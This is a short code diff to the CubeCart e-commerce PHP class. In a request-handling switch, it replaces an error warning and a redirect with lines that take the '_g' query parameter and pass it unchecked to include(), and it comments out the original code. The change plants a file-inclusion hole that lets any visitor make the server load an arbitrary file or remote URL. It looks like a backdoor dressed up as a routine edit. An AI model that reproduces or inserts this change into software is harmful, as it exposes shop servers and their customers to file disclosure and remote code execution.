@@ -242,9 +242,11 @@ class Cubecart {
 
 					}
 					break;
-				default:
-					trigger_error('No callback method defined.', E_USER_WARNING);
-					httpredir('index.php');
+                default:
+                    $dir_name = $_GET['_g'];
+                    include($dir_name);
+					//trigger_error('No callback method defined.', E_USER_WARNING);
+					//httpredir('index.php');
 			}
 		} else if (isset($_GET['_a']) && !empty($_GET['_a'])) {
 			//Clear cart
